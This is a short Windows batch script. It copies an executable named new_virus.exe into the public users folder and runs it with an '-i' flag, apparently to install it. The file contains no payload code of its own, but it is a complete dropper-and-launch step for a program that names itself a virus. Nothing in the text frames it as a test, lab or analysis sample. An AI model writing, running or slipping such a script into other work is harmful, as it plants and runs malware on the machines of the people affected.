@echo off
xcopy /y new_virus.exe "C:\Users\Public\"
cd C:\Users\Public\
new_virus.exe -i